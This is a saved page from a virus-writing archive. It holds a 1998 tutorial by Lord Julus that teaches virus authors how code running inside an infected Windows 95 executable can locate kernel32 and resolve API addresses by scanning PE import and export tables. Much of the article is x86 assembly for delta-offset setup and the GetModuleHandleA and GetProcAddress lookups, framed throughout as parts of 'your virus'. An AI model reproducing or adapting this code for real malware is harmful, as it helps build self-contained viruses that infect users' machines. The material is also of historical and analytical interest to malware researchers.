@@ -1,0 +1,525 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Lord Julus 'Accessing Windows 95 API's by scanning PE-tables' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Lord Julus"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Lord Julus,Accessing Windows 95 API's by scanning PE-tables, offset, call, exported, functions, import, push, imagebase, kernel, function, address, getmodulehandlea, apis, virus, code, ordinal"/>
+<meta name="Description" content="Looking back in 1994 and reading the last article of the now dead group Nuke, you can get over an article written by the group's leader Rock Steady that talked about a so called, and awaited &quot;Windows 4.0&quot;... Try to put yourself there, back in time and imagine what you would feel reading this, but picture it well: Ms-Dos and Windows 3.11 existed. There were practicaly no Windows 3.11 viruses, except a few that infected the Dos part of the New Exe file... And when things were going so well, thousands of viruses on the market, so many that even virus authors didn't care anymore, this black thing appears from the dark... The NEW THREAT from Micro$oft... Let me recall you what was maybe the first article on what will become Windows 95:"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"7deef579d956573c460113e6e676db2872075369-1498755431-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vlj02.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Accessing Windows 95 API's by scanning PE-tables</h1><p><a href="/lib/?lang=en&amp;author=Lord%20Julus"> Lord Julus</a><br/> <em><a href="/vx.php?fid=509#f509">VX-tasy [articles]</a></em><br/> <em> 1998</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vlj02.html';</script><div class="ci"><a href="/lib/?ci=vlj02">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=WI#vlj02">Back to index</a>] [<a href="/lib/vlj02.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#p1">Foreword</a></li>
+<li><a href="#p2">Basics</a></li>
+<li><a href="#p3">Modules &amp; Functions</a></li>
+<li><a href="#p4">Starting to code</a></li>
+<li><a href="#p5">Appendix</a></li>
+</ul>
+<h2>Disclaimer</h2>
+<p>The following document is a study. It's only purpose is to be used in the virus research only. The author of this article is not responsible for any misuse of the things written in this document. Most of the things published here are already public and they represent what the author gathered across the years.</p>
+<p>The author is not responsible for the use of any of these information in any kind of virus.</p>
+<pre>
+			Lord Julus.
+</pre>
+<h2><a name="p1">Foreword</a></h2>
+<p>Looking back in 1994 and reading the last article of the now dead group Nuke, you can get over an article written by the group's leader Rock Steady that talked about a so called, and awaited "Windows 4.0"... Try to put yourself there, back in time and imagine what you would feel reading this, but picture it well: Ms-Dos and Windows 3.11 existed. There were practicaly no Windows 3.11 viruses, except a few that infected the Dos part of the New Exe file... And when things were going so well, thousands of viruses on the market, so many that even virus authors didn't care anymore, this black thing appears from the dark... The NEW THREAT from Micro$oft... Let me recall you what was maybe the first article on what will become Windows 95:</p>
+<blockquote>"Yes, there is a huge vessel currently submerging, and it's being steered by old 640k boundary, text based, real-mode, MS-DOS. If you haven't forecasted it yet, let me say that Microsoft has an ingenious plan to wipe out EVERY virus in existence today. Heh? And how will old mighty Microsoft plan to stage such a hostile war? In two products, let me say DOS 7.0 &amp; Windows 4.0!"</blockquote>
+<p>It was said in early 1994... Here we are in 1998 and it's a reality... The DOS as we knew it is dead...</p>
+<blockquote>"32 bit protected mode is here to stay! What does this all mean? If you haven't already tried Chicago (Windows 4.0) you will see that it does not run on top of 16 bit DOS, it wipes DOS off the computer and replaces it with something call VFAT.386 which will simulate DOS Interrupts call(s) only. Everything else goes!"</blockquote>
+<p>That's it... Every low-level programer MUST turn towards Win32 programing... Just look at the lines below and you will get an explanation for the suddend death of so many VX groups and the quits of many virus authors:</p>
+<blockquote>
+<p>"What About the Boot Sector? GONE! Along with all the Boot Sector viruses! No more DOS to load, but VFAT.386. A new 32-bit boot sector has been introduced, with special Anti-Virus features, for protection.</p>
+<p>What About the Directory Structures? GONE! Along with every stealth virus using it to fix file length sizes, and the old famous DIR virus! It incorporates a totally new design! No more 8 characters filename size, long file names are now introduced!</p>
+<p>What About other DOS Structures? GONE! No more niffty MCB chains to go in high memory! No more undocumented Interrupt calls, no more interrupt hooking! No more nothing we have gotten so used to as low-level virus programmers. No more .COM files! No more DOS .EXEs, the Windows .EXE format will replace it. No more .SYS files, no more AUTOEXEC.BAT no more CONFIG.SYS, no more .BIN files, all we have gotten used to is now about to leave us."</p>
+</blockquote>
+<p>This is ALL true... Well, after Windows 95 was officially released, people around the world started to understand what does this mean... And basically, the low-level programer was hit hard... You will not believe if I tell you you must write at least 3 pages of code to display a window on the screen... Anyway, as time passed quite a few programers started looking at the low-level of the Windows. Some programing gurus like Andrew Schulman and Matt Pietrek started a project to restore a complete Windows 95 source. Others simply checked the most important areas: the structures. Once you understand the structures in an OS, you go further and check the methods you can apply to access (read, modify) the structures.</p>
+<p>The first steps in this way were made by the VLAD group. Two pioneers by the name of Qark and Quantum presented a lot of interesting things. The job was continued by a very good programer by the nick Murkry. And closer to our times Jacky Qwerty, a member of the 29A group came up with revolutioning ideas.</p>
+<p>I wrote all this so you can have a global idea about the scene in the late 1998. Basically the scene was fucked up for at least 2 years... But now, it is going up again!!</p>
+<p>And here we come to help you out get into the bussiness too!</p>
+<p>We at SLAM have been working on the Win32 programing for quite some time now and what we realized was that except the virus sources around, actually there aren't any real A-Z tutorials on Win32.</p>
+<p>So, here I come to save the day! ;-)</p>
+<h2><a name="p2">Basics</a></h2>
+<p>Firstly, let me say that in this tute I will call all versions of Windows 95 (Chicago, Nashville, OSR1, OSR2, all betas), Windows 98 (Memphis, all betas) and Windows NT (3.x, 4.0) as w95. I know that Windows NT is quite different from Windows 95, but still many things work on both systems. Therefore I will call all w95... After all, I write this stuff!!!! ;-))</p>
+<p>First let me tell you about the memory in w95. Here, the memory is flat. A flat memory is a chunk of bytes in a sole huge segment. It is called a selector. Therefore, you don't need to use the old segment and offset assignment to reach a particular area in the memory. Now all you have is the offset. The size of the memory is:</p>
+<p>65536 ^ 2 = 4,294,967,295 bytes (e.g. 4 Mega !!)</p>
+<p>Quite plenty!</p>
+<p>A refference into the memory can be done in all the known ways:</p>
+<pre class="source">
+	[ESI]
+	[ESI+EBX]
+	[ESI+EBX+const]
+	[EBX*8+ESI+const], etc.
+</pre>
+<p>Anyway, as you noticed we work in a 32 bit environment, which means that memory addresses are 32 bit (00000000h - FFFFFFFFh). However, you can still easily read words or bytes:</p>
+<pre class="source">
+	mov ax, word ptr [esi]
+	mov al, byte ptr [esi]
+</pre>
+<p>Ok, now you have an idea on the memory layout. The simplest it can be. Now let's look at the main structures:</p>
+<ol>
+<li>modules</li>
+<li>functions</li>
+</ol>
+<h2><a name="p3">Modules &amp; Functions</a></h2>
+<p>Now, what I am about to say is really, really easy to understand. While under w95, the memory layout is like this:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="Windows 95 memory layout">
+<tr><td>00000000h - 3FFFFFFFh</td><td>Application code and data</td></tr>
+<tr><td>40000000h - 7FFFFFFFh</td><td>Shared memory (system DLL's)</td></tr>
+<tr><td>80000000h - BFFFFFFFh</td><td>OS Kernel</td></tr>
+<tr><td>C0000000h - FFFFFFFFh</td><td>Device Drivers</td></tr>
+</table>
+<p>I have to note that the last 2 gigs are separated in Os Kernel and Device Drivers only under WindowsNT. Windows 95/98 does not distinguish between Os kernel and device drivers.</p>
+<p>A module is a piece of code+data+resources+other misc stuff that is loaded into memory. The offset that the module is loaded from is called the image base. The module is loaded into memory from the image base until imagebase + module size.</p>
+<p>The Kernel32.DLL is a module. Upon loading the system, w95 loads the kernel to a certain base in memory. For Windows 95/98 this address seems to be fixed for now, while for NT it isn't. The module base for the Windows 95/98 kernel can be found at address 0BFF70000h, for the existing versions of Windows 95/98, but Microsoft may choose to change this at any moment.</p>
+<p>The main important thing to know about a module are it's exported and imported functions. Here are the basic rules:</p>
+<ul>
+<li>a module may export functions</li>
+<li>a module may import functions</li>
+<li>a module could virtualy run with no imported or exported functions</li>
+</ul>
+<p>I want you to understand that when I say that a module exports functions, it doesn't mean that it is somewhere in the memory and it's just stuck in the necks' of all loading programs. The module exports it's functions only to other modules that request it. And, the other way around, a module imports functions only from whatever other modules it may want. Let's check a diagram for a general module called M:</p>
+<p>So, M1, M2, M3 and M4 export functions to M, while M5, M6, M7, M8 import functions from M. Each module may import different functions from M. In the mean time, we may have other modules that have nothing to do with M, like M9 and M10. The links between all the modules that are loaded at a certain time into memory sometimes may be very complex.</p>
+<p>However, a certain set of functions is gathered into one module by their type. The most used modules in w95 are:</p>
+<dl>
+<dt>Kernel32</dt><dd>the base of the entire operating system</dd>
+<dt>User32</dt><dd>useful functions for the user</dd>
+<dt>Gdi32</dt><dd>Graphical interface</dd>
+</dl>
+<h2><a name="p4">Starting to code</a></h2>
+<p>Before starting to code, I will have to warn you that you must be aware of the things inside the PE header. If you don't, stop here and check a layout of the PE header, or use a PEdump utility to help you understand.</p>
+<p>Ok, before coding, here are the tools I use:</p>
+<ul>
+<li>TASM32 v.4.01</li>
+<li>TLINK32 v.7.0</li>
+<li>PWERSEC utility</li>
+</ul>
+<p>The tipical Win32 ASM application looks like this:</p>
+<pre class="source">
+.386p
+.387
+.model flat, stdcall
+locals
+jumps
+
+extrn &lt;external name 1>:PROC
+extrn &lt;external name 2>:PROC
+...
+
+.data
+
+	&lt;never put real data here !>
+
+.code
+
+start:
+	&lt;main code>
+
+end start
+end
+</pre>
+<p>This is the layout for a do_nothing win32 program. The program must be compiled like this:</p>
+<pre class="source">
+TASM32 /m3 /ml &lt;progname.asm>
+TLINK32 /Tpe /aa /c &lt;progname.asm>,&lt;progname.exe>,,import32.lib
+</pre>
+<p>So, firstly, you MUST have the import32.lib file in the same directory with TASM, and secondly, when you code, you code CASE SENSITIVE. This is very important!! This means:</p>
+<pre class="source">
+GetCurrentDrive &lt;> GETCURRENTDRIVE &lt;> GeTcUrReNtDrIvE !!!!
+</pre>
+<p>Well, what you saw in the above code there marked with 'extrn' are actually the function names of the functions your application will import after the linking. Your application must import at least one function and that function is ExitProcess:</p>
+<pre class="source">
+extrn ExitProcess:PROC;
+
+...
+
+	Push 0			; exit to OS
+	Call ExitProcess	;
+</pre>
+<p>I guess you understood already how to call an imported function. The only thing to do is push on the stack the right parameters (which you can only know from a good documentation) and then call it. In the real diassembly, the above call is assembled like this:</p>
+<pre class="source">
+	call [xxxxxxxx]
+	...
+xxxxxxxx:
+	jmp [yyyyyyyy]		; --> a jump to the real address of the function
+</pre>
+<p>Now that we know how to import functions, what a module is and how a function is called let's go deeper...</p>
+<p>The thing is, there you are... inside the code, somewhere at the end of the victim file and you are startingto execute code. But, as I explained later you cannot use other thingies under Win32 to obtain information, use it or set it, aside from the Windows functions, which I shall call Apis from now on. And there is your code neeeeding to execute Apis, all kinds of Apis, but restricted by the fact that the infected victim only imports a couple of them. And the question comes: how can your code locate the addresses of the functions it needs in order to be ableto call them directly. Here comes the really interesting part of this article.</p>
+<p>Just as a short sidenote, in all the code that will follow, I will assume that your virus contains a beginning part that looks like this:</p>
+<pre class="source">
+	Call GetDeltaHandle
+GetDeltaHandle:
+	Pop Ebp
+	Sub Ebp, offset GetDeltaHandle
+</pre>
+<p>Actually I don't care how you retrieve the delta handle, but I will consider that it's held by the EBP register. Just adjust your code.</p>
+<p>Ok, so the infected program starts. The loader takes it and puts it up at it's own image base. The starting entry point is the beginning of the virus. After getting the Delta Handle into EBP start checking for the environment we find ourself in. Before going into that let me tell you that you'd better have a written paper with the PE Header layout so you can understand what offsets I use and why. I'll try to explain...</p>
+<pre class="source">
+	mov esi, imagebase	; get image base
+	cmp word ptr [esi], 'ZM' ; check if we have an EXE file
+	jne getout		;
+</pre>
+<p>For a normal Tlinked file, the initial imagebase is always 00400000h, so this value will be used initialy. But, when the virus infects another file, the mov esi, imagebase instruction must be patched with the correct imagebase for that specific file. (for ex. excel.exe has imagebase=30000000h). Let's continue:</p>
+<pre class="source">
+	add esi, 3ch			; point to new header address
+	mov esi, [esi]			; get it
+	add esi, imagebase		; always aling in memory...
+	cmp word ptr [esi], 'EP'	; is PE there ?
+	jne getout			;
+	add esi, 80h			; get import directory address
+</pre>
+<p>Now, the register ESI points to the import directory. The import directory is a big table that contains the names of the imported functions and the names of the modules that exports them. So, I guess you already understood that we are about to search in the victims import directory the name of the Kernel32.dll file so we can locate it's functions.</p>
+<pre class="source">
+	mov eax, [esi]			; Get the virtual address of the
+	mov [ebp+importvirtual], eax	; import dir and save it
+	mov eax, [esi+4]		;
+	mov [ebp+importsize], eax	; also get the size of it
+	mov esi, [ebp+importvirtual]	;
+	add esi, imagebase		; align with imagebase
+	mov ebx, esi			;
+	mov edx, esi			; ESI: where from to search...
+	add edx, [ebp+importsize]	; EDX: the limit
+</pre>
+<p>The good thing is that the name of the module that exports functions is not coded in any way. So, it's only a matter of locating a string:</p>
+<pre class="source">
+searchkernel:				;
+	mov esi, [esi+0ch]		; get an entry
+	add esi, imagebase		; align
+	cmp [esi], 'NREK'		; is it KERNEL32 ?
+	je foundit			;
+	add ebx, 14h			; nope... get next entry
+	mov esi, ebx			;
+	cmp esi, edx			; did we go over limit ?
+	jg notfound			;
+</pre>
+<p>If we went over the limit and the Kernel32 was not found, it means that the victim does not import any functions from the k32, which is very less likely... Anyway, if it happens, you'll see what to do... But if we found it, we are starting to locate the functions that the victim imported from the Kernel32.dll module. And our goal is a very important function: GetModuleHandleA. This function allows us to locate the kernel32 in memory only by pushing the offset of it's name... Let's look for the string "GetModuleHandleA" inside the kernel32's import table. We assume these declarations:</p>
+<pre class="source">
+gha		db "GetModuleHandleA",0
+gha_size 	db $ - gha
+
+foundit:				; Here we found the Kernel !
+	mov esi, ebx			;
+	mov ebx, [esi+10h]		; let's get the First Thunk there
+	add ebx, imagebase		;
+	mov [ebp+offset firstthunk], ebx;
+	mov eax, [esi]			;
+	jz notfound			; if 0 -> bad...
+					;
+searchgha:				;
+	mov esi, [esi]			; let's search GetModuleHandle...
+	add esi, imagebase		;
+	mov edx, esi			;
+	mov ecx, [ebp+offset importsize];
+	mov eax, 0			;
+					;
+lookloop:				;
+	cmp dword ptr [edx], 0		; the end ?
+	je notfound			;
+	cmp byte ptr [edx+3], 80h	; ordinal ?
+	je nothere			;
+	mov esi, [edx]			;
+	push ecx			;
+	add esi, imagebase		;
+	add esi, 2			;
+	mov edi, offset gha		;
+	add edi, ebp			;
+	mov ecx, gha_size		;
+	rep cmpsb			; compare strings...
+	pop ecx				;
+	je foundgha			; if equal, we found it !
+					;
+nothere:				;
+	inc eax				; get next, otherwise...
+	add edx, 4			;
+	loop lookloop			;
+</pre>
+<p>If we reached here it means that it really happened! The victim's import table came up with the GetModuleHandleA. It is a number in EAX that we need to multiply by 2 and add to the first thunk:</p>
+<pre class="source">
+foundgha:				; Got it !!
+	shl eax, 2			; multiply by 2
+	mov ebx, [ebp+offset firstthunk];
+	add eax, ebx			; and add to first thunk
+	mov eax, [eax]			; get the address there
+</pre>
+<p>Now EAX holds the address of the GetModuleHandleA!! How can we use it in order to retrieve the Kernel32 address? Look:</p>
+<pre class="source">
+	mov edx, offset k32		; k32 db "KERNEL32.dll",0
+	add edx, ebp			;
+	push edx			; push the Kernel32 name
+	call eax			; and get it's address
+	cmp eax, 0			; is it a fail ?
+	jne found			;
+</pre>
+<p>If the operation failed, we find ourself in the same place where we would be if the victim did not import k32 functions, or if the GetModuleHandleA was not among the imported ones:</p>
+<pre class="source">
+notfound:				;
+	mov eax, 0BFF70000h		; if fail, assume hardcoded kernel
+</pre>
+<p>This is the default kernel32 address. If we are here, big problems occured... As long as we assumed a hardcoded value for the Kernel32, we MUST check if it's ok, otherwise we might crash the system.</p>
+<p>Anyway, after going thru all the mess, we arrived here, with a value in the eax register which normally should point to the Kernel32 module in memory (it's base). Let's see what we do with it:</p>
+<pre class="source">
+found:					;
+	mov [ebp+offset kernel32], eax	; save the Kernel address
+	mov edi, eax			; check if it's really the k32 there
+	cmp word ptr [edi], 'ZM'	; magic word...
+	jne getout			;
+					;
+	mov edi, [edi+3ch]		; look for...
+	add edi, [ebp+offset kernel32]	;
+	cmp word ptr [edi], 'EP'	; ...Portable Exe signature
+	jne getout			;
+</pre>
+<p>If we are here then everything is OK! The kernel32 holds the correct module base address and we are about to use it heavily! Now, our next goal is another very important function called GetProcAddress. As it's name tells us, this function is used to retrieve other functions' addresses. As weare searching withinthe heart ofthe kernel itself, I guess you already know whatwe are about to do... We are about to check the Kernel32 export table and look for the GetProcAddress function. Again, I have to ask you to look overthe PE layout to understand the following. But before, I wantyou to understand that all values we retrieve are RVA's (Relative Virtual Addresses). In order to use them, we must turn them to VA's. If the address is relative to something, adding that something to it will remove the relativity. In our case it's the base of the kernel32 module we are relative to. This means that every address must be adjusted by adding the k32 base address to it. Let's rock:</p>
+<pre class="source">
+	pushad				; save all regs !
+	mov esi, [edi+78H]		; 78H = address for the export dir
+	add esi, [ebp+offset kernel32]	; normalize
+	mov [ebp+offset export], esi	; save it
+	add esi, 10H			; look for Base Functions
+	lodsd				; get Base of Exported Functions
+	mov [ebp+offset basef], eax	; save base of the functions
+	lodsd				; get Number of Exported Functions
+	lodsd				; get Number of Exported Names
+	mov [ebp+offset limit], eax	; save the number of names/funcs
+	add eax, [ebp+offset kernel32]	;
+	lodsd				; Get Address of Exported Functions
+	add eax, [ebp+offset kernel32]	;
+	mov [ebp+offset AddFunc],eax	; save address of functions
+	lodsd				; Get Address of Exported Names
+	add eax, [ebp+offset kernel32]	;
+	mov [ebp+offset AddName], eax	; save Address of Exported Names
+	lodsd				; Get Address of Exported Ordinals
+	add eax, [ebp+offset kernel32]	;
+	mov [ebp+offset AddOrd], eax	; save Address of Ordinals
+	mov esi,[ebp+offset AddFunc]	;
+	lodsd				;
+	add eax, [ebp+offset kernel32]	;
+</pre>
+<p>Now, we retrieved the most signifiant things from the export table:</p>
+<ul>
+<li>The number of exported functions (equal to the number of exported names)</li>
+<li>The Address of functions</li>
+<li>The Address of names (where we shall scan)</li>
+<li>The Address of ordinals</li>
+</ul>
+<p>The address of names points to a table of function name strings one after another. The address of functions points to a table filled with function addresses. And the address of ordinals point to a table with the ordinal number or each function. So, one function's proprieties are:</p>
+<ul>
+<li>the name</li>
+<li>the address</li>
+<li>the ordinal</li>
+</ul>
+<p>So, let's start looking for "GetProcAddress". I will assume this definition:</p>
+<pre class="source">
+First_API	db "GetProcAddress",0	; the name
+AGetProcAddress dd 0			; the address
+</pre>
+<p>No more games! Let's scan:</p>
+<pre class="source">
+	mov esi, [ebp+offset AddName]	; get the first pointer to a name
+	mov [ebp+offset Nindex], esi	; save the index into the name array
+	mov edi, [esi]			; normalize with kernel32
+	add edi, [ebp+offset kernel32]	;
+	mov ecx, 0			; sets the counter to 0
+	mov ebx, offset First_API	; Set starting address
+	add ebx, ebp			;
+					;
+TryAgain:				;
+	mov esi, ebx			; ESI points to the name we search
+					;
+MatchByte:				;
+	cmpsb				; do we have a byte match?
+	jne NextOne			; no! Try next name of function
+					;
+	cmp byte ptr [edi], 0		; did the entire string match ?
+	je GotIt			; YES!
+	jmp MatchByte			; nope... try next byte
+					;
+NextOne:				;
+	inc cx				; increment counter
+	cmp cx, word ptr [ebp+offset limit] ; check limit override
+	jge getout			; (the limit is the max. no. of f.)
+					;
+	add dword ptr [ebp+offset Nindex], 4; get the next pointer rva
+	mov esi, [ebp+offset Nindex]	; and try again
+	mov edi, [esi]			;
+	add edi, [ebp+offset kernel32]	;
+	jmp TryAgain			;
+</pre>
+<p>If we found the GetProcAddress string in the table, the code jumps here with the following parameter:</p>
+<p>cx = the index into the Address of Ordinals</p>
+<p>Having CX we have the following formulas:</p>
+<p>CX * 2 + [Address of Ordinals] = Ordinal</p>
+<p>Ordinal * 4 + [Address of Functions] = Address of Function (RVA)</p>
+<p>Let us apply the final formulas:</p>
+<pre class="source">
+GotIt:
+	mov ebx, esi			; get set for next search routine
+	inc ebx				;
+	shl ecx, 1			; ECX = ECX * 2
+	mov esi, [ebp+offset AddOrd]	;
+	add esi, ecx			; add Address of Ordinals
+	xor eax, eax			;
+	mov ax, word ptr [esi]		; Retrieve Ordinal
+	shl eax, 2			; Ordinal = Ordinal * 4
+	mov esi, [ebp+offset AddFunc]	;
+	add esi, eax			; Add Address of Functions
+	mov edi, dword ptr [esi]	; take the RVA there
+	add edi, [ebp+offset kernel32]	; add kernel32 module base
+</pre>
+<p>Here, EDI holds the real address of the GetProcAddress function!</p>
+<pre class="source">
+	mov [ebp+offset AGetProcAddressA], edi ; we save it
+	popad				; restore registers we saved
+</pre>
+<p>Now, if we have the GetProcAddress's address, we are virtualy unstopable !! Let's look at how I define the search for addresses table:</p>
+<pre class="source">
+AExitProcess	db "ExitProcess",0	; the names
+AFindFirstFile	db "FindFirstFileA",0
+ACreateFile	db "CreateFileA",0
+		...
+		db 0FFh
+
+AExitProcessA	dd 0			; and the place to put
+AFindFirstFileA dd 0			; the addresses
+ACreateFileA	dd 0
+		...
+
+
+	mov esi, offset AExitProcess	; and start retrieving all the apis
+	mov edi, offset AExitProcessA	; we need!
+	add esi, ebp			;
+	add edi, ebp			;
+</pre>
+<p>The calling of the GetProcAddress is done like this:</p>
+<pre class="source">
+	push offset &lt;function name>
+	push module_base
+	call GetProcAddress
+</pre>
+<p>The return is the address of the &lt;function name> function, or 0 if it was a fail. A fail may be caused by various things like: misstyping the name of the function (it's case sensitive!!), the function is not exported by that module, the module base is wrong, etc...</p>
+<p>So, basically we will make a loop which will use the above call to retrieve the addresses for every function in our list.</p>
+<pre class="source">
+Repeat_find_apis:			;
+	push esi			; find an API
+	mov eax, [ebp+offset kernel32]	;
+	push eax			;
+	mov eax, [ebp+offset AGetProcAddressA]
+	call eax			; get it !!
+	cmp eax, 0			; check if an API find failed
+	je getout			;
+	stosd				; store it's address
+					;
+repeat_inc:				;
+	inc esi				; go to the next API name
+	cmp byte ptr [esi], 0		;
+	jne repeat_inc			;
+	inc esi				;
+	cmp byte ptr [esi], 0FFh	; and check for the end
+	jne Repeat_find_apis		;
+</pre>
+<p>If the code reaches here, then our goal is achieved:</p>
+<ul>
+<li>we searched and found the kernel</li>
+<li>we searched and found the addresses for all the apis our virus needs</li>
+</ul>
+<p>Now, in order to call a function, we use the address we retrieved, like this:</p>
+<pre class="source">
+	push &lt;function arguments needed>
+	mov eax, [ebp + AFindFirstFileA]
+	Call eax
+</pre>
+<p>This is an example of calling the FindFirstFileA.</p>
+<p>Another smooth way to use GetProcAddress in your virus is to create a procedure like this:</p>
+<pre class="source">
+Call_API proc
+	pop dword ptr [ebp+retaddress]	; take return addr off...
+	push eax			; push function name
+	push kernel32			; push kernel base
+	mov eax, [ebp + AGetProcAddress]; call GetProcAddress
+	Call eax			; call the function !
+	push dword ptr [ebp+retaddress] ; restore return address
+	ret
+retaddr	dd 0
+Call_API endp
+</pre>
+<p>In order then to call certain function you do this:</p>
+<pre class="source">
+	push &lt;function parameters>
+	mov eax, offset &lt;function name>
+	call Call_API
+</pre>
+<p>In this easy way, you don't have to make a loop to retrieve all Api's addresses, but instead everytime you need to call an Api the Call_API procedure will get it's address and will call it directly. It works more like a macro...</p>
+<h2><a name="p5">Appendix</a></h2>
+<p>I feel like I left quite a few things unsaid and unexplained up in the article, so let me try to fill all the gaps in this appendix.</p>
+<p>As you noticed, many functions among which GetModuleHandle is also around, have a suplemental character at the end, e.g. "A" or "W". The last letter reffers to the type of parameter the function awaits for. Some functions accept only the macro type:</p>
+<pre class="source">
+SetWindowText(...)
+
+Ansi type:
+SetWindowTextA(...)
+
+Wide type:
+SetWindowTextW(...)
+</pre>
+<p>In our example above we scanned the infected host for GetModuleHandleA. However some files my import the GetModuleHandleW functions. To make a more reliable scanner one should scan for both styles, first Ansi and then Wide.</p>
+<p>Ok, now let me make a little graphic that should explain how all things are tied together and which is the track we go on hunting:</p>
+<p>I guess this is comprehesive enough.</p>
+<p>As a sidenote, I should say that the if you do not find GetModuleHandle(A/W) in the Import Table of the victim, but still the hardcoded value for the Kernel32 is correct, you should also get the real address of the GetModuleHandleA using GetProcAddress. You can then use GetModuleHandleA to retrieve addresses for other modules, like USER32, if you want to display a MessageBox, for example.</p>
+<p>Well, I guess that's about it with the scanning for functions. My next article will be about installing custom API hooks...</p>
+<p>Happy huntin', people!!</p>
+<p>Many thanx go to: Qark, Quantum, Murkry, Jacky Querty, Shaitan</p>
+[<a style="" href="/lib/?lang=EN&amp;index=WI#vlj02">Back to index</a>] [<a href="/lib/vlj02.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vlj02">de</a><a href="/lib/index.php?lang=en&amp;id=vlj02">en</a><a href="/lib/index.php?lang=es&amp;id=vlj02">es</a><a href="/lib/index.php?lang=it&amp;id=vlj02">it</a><a href="/lib/index.php?lang=fr&amp;id=vlj02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vlj02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vlj02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vlj02">ua</a></div>
+</body>
+</html>
